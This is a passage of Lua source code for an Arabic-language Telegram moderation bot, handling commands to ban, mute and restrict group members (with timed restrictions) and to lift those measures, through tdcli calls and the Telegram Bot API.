send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠┇ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠┇ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'☑️┇ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.id_)
usertext = '\n👤┇ المستخدم » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم حظره من المجموعه'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '⚠┇ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^حظر (%d+)$") and Mod(msg) then
local userid = text:match("^حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'🔖┇ تم تعطيل الحظر من قبل المنشئين') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇ لا تسطيع حظر البوت")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠┇ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'☑️┇ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, userid)
chat_kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم حظره من المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇ العضو » '..userid..''
status  = '\n☑️┇ تم حظره من المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end,nil)   
end
return false
end
if text == ("الغاء حظر") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '☑️┇ انا لست محظورا \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم الغاء حظره من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and Mod(msg) then
local username = text:match("^الغاء حظر @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '☑️┇ انا لست محظورا \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء حظره من هنا'
texts = usertext..status
else
texts = '⚠┇ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '☑️┇ انا لست محظورا \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء حظره من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇لعضو » '..userid..''
status  = '\n☑️┇ تم الغاء حظره من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المكتومين' and Mod(msg) then
database:del(bot_id..'Muted:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '🗑┇  تم مسح قائمه المكتومين ')
end
if text == ("المكتومين") and Mod(msg) then
local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
t = "\n☑️┇ قائمة المكتومين \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
end
end
if #list == 0 then
t = "✖┇ لا يوجد مكتومين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'☑️┇ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n??┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم @(.*)$") and Mod(msg) then
local username = text:match("^كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'??┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'☑️┇ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠┇ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم كتمه من هنا'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
end
else
send(msg.chat_id_, msg.id_, '⚠┇لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match('^كتم (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n🔰┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑┇ تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^كتم (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"💢┇ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑┇ تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
local userid = text:match("^كتم (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'☑️┇ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇ العضو » '..userid..''
status  = '\n☑️┇ تم كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
if text == ("الغاء كتم") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم الغاء كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and Mod(msg) then
local username = text:match("^الغاء كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء كتمه من هنا'
texts = usertext..status
else
texts = '⚠┇ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء كتم (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم الغاء كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇ العضو » '..userid..''
status  = '\n☑️┇ تم الغاء كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == ("تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇ لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم تقييده في المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد @(.*)$") and Mod(msg) then
local username = text:match("^تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇ لا تسطيع تقيد البوت ")
return false 
end
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠┇ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
 
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم تقييده في المجموعه'
texts = usertext..status
else
texts = '⚠┇ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match('^تقيد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n🔰┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑┇ تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^تقيد (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"💢┇ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑┇ تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇ لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(userid,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم تقييده في المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇ العضو » '..userid..''
status  = '\n☑️┇ تم تقييده في المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
------------------------------------------------------------------------
if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم الغاء تقييده'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
local username = text:match("^الغاء تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
